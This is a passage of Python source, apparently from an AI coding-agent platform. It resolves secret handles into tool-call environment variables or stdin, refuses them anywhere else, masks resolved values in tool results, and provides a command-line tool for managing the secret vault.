    # A handle is only dangerous where it can be RESOLVED. A call with no sink at
    # all (writing a file, a design note, a tool schema) keeps the handle as inert
    # text, otherwise the platform could not write its own documentation. As soon
    # as the call carries one usable sink, a handle anywhere else is a mistake and
    # is refused: the model meant to interpolate it into a place that would leak.
    has_sink = any(sink_for_path(path) for path, _, _ in handles)

    for path, text, handle in handles:
        sink = sink_for_path(path)
        where = ".".join(path) or "<args>"
        if sink is None:
            if not has_sink:
                vault._audit("ignored", secret=handle.name, tool=tool, step=step_id,
                             sink=where)
                notices.append(
                    f"{handle.raw} in '{where}' stayed as text: only the 'env' and "
                    "'stdin' parameters are resolved"
                )
                continue
            error = vault._deny("denied_sink", handle.name, tool, step_id, "-",
                                f"{handle.raw} in '{where}': only the 'env' and 'stdin' "
                                "parameters accept a secret handle")
            return ToolParamsResolution(params=params, redactions=redactions,
                                        error=error.render(), secret_names=names)
        if text.strip() != handle.raw:
            error = vault._deny("denied_sink", handle.name, tool, step_id, sink,
                                f"{handle.raw} in '{where}' is mixed with other text; "
                                "a handle must be the whole value")
            return ToolParamsResolution(params=params, redactions=redactions,
                                        error=error.render(), secret_names=names)

        resolved = vault.resolve(handle.name, tool=tool, step_id=step_id,
                                 sink=sink, source=handle.source)
        if isinstance(resolved, SecretError):
            return ToolParamsResolution(params=params, redactions=redactions,
                                        error=resolved.render(), secret_names=names)

        if sink == SINK_ENV:
            target = str(path[1])
            if not _ENV_NAME_PATTERN.match(target):
                error = vault._deny("denied_sink", handle.name, tool, step_id, sink,
                                    f"{target!r} is not a valid environment variable name")
                return ToolParamsResolution(params=params, redactions=redactions,
                                            error=error.render(), secret_names=names)
            resolved_params.setdefault(ENV_PARAM, {})[target] = resolved.value
        else:
            resolved_params[STDIN_PARAM] = resolved.value
        redactions.add(handle.name, resolved.value)

    return ToolParamsResolution(params=resolved_params, redactions=redactions,
                                secret_names=names, notices=notices)


def redact_result(result: Any, redactions: Optional[RedactionSet]) -> Any:
    """Mask every resolved value inside a tool result, in place.

    Handles ``str`` results and ``ToolResponse``-shaped objects (``llm_response``,
    ``user_response``, ``logs``), because those are exactly the surfaces that
    reach the event stream, the cache and the model. A read-only result is left
    untouched instead of raising: redaction must never break a tool call.
    """
    if not redactions:
        return result
    if isinstance(result, str):
        return redactions.mask(result)
    for attribute in ("llm_response", "user_response"):
        value = getattr(result, attribute, None)
        if isinstance(value, str):
            try:
                setattr(result, attribute, redactions.mask(value))
            except Exception:
                pass
    logs = getattr(result, "logs", None)
    if isinstance(logs, list):
        try:
            setattr(result, "logs", [redactions.mask(log) if isinstance(log, str) else log
                                     for log in logs])
        except Exception:
            pass
    return result


def main(argv: Optional[Sequence[str]] = None) -> int:
    """Out-of-band CLI: the only writer of vault values.

    The value is read from the terminal (or stdin) and never printed, so it
    cannot reach a shell history, a chat message or a log line.
    """
    import argparse
    import getpass

    parser = argparse.ArgumentParser(prog="codx-junior-secrets")
    parser.add_argument("command", choices=["list", "add", "rm", "grant", "keygen"])
    parser.add_argument("name", nargs="?")
    parser.add_argument("--tools", default="", help="comma separated allow list (prefix* allowed)")
    parser.add_argument("--description", default="")
    parser.add_argument("--project", default="", help="project path (defaults to cwd)")
    parser.add_argument("--scope", default=SCOPE_PROJECT, choices=list(SCOPES),
                        help="store in the project vault or in the machine-wide one")
    parser.add_argument("--write", dest="write_key", action="store_true",
                        help="keygen: store the key in the key file (mode 0600)")
    args = parser.parse_args(list(argv) if argv is not None else None)
    vault = SecretVault(args.project or os.getcwd(), scope=args.scope)

    if args.command == "keygen":
        try:
            from cryptography.fernet import Fernet  # type: ignore
        except Exception:
            print("install the 'cryptography' package first (vault source needs it)")
            return 1
        existing = _read_key_file()
        if existing:
            print(f"a vault key already exists at {vault_key_path()} (not overwritten)")
            return 0
        generated = Fernet.generate_key().decode("ascii")
        if args.write_key:
            path = _write_key_file(generated)
            print(f"vault key written to {path} (mode 0600)")
        else:
            print(f"{VAULT_KEY_ENV}={generated}")
        return 0

    if args.command == "list":
        for meta in vault.list():
            tools = ",".join(meta.allow_tools) or "-"
            print(f"{meta.name}\t{meta.scope}\t{meta.source}\t{meta.status}\t{tools}\t{meta.description}")
        return 0

    if not args.name:
        print("a secret name is required")
        return 2
    tools = [item.strip() for item in (args.tools or "").split(",") if item.strip()]

    if args.command == "rm":
        error = vault.delete(args.name)
        print(error.render() if error else f"deleted {args.name}")
        return 1 if error else 0

    if args.command == "grant":
        if not tools:
            print("--tools is required")
            return 2
        vault.declare(args.name, source=SOURCE_VAULT, description=args.description,
                      allow_tools=tools)
        print(f"granted {args.name} to {', '.join(tools)}")
        return 0

    if sys.stdin.isatty():
        first = getpass.getpass(f"value for {args.name}: ")
        second = getpass.getpass("repeat: ")
        if first != second:
            print("the values do not match")
            return 2
    else:
        first = sys.stdin.readline().rstrip("\n")
    if not first:
        print("empty value")
        return 2
    error = vault.set_value(args.name, first, allow_tools=tools, description=args.description)
    print(error.render() if error else f"stored {args.name}")
    return 1 if error else 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
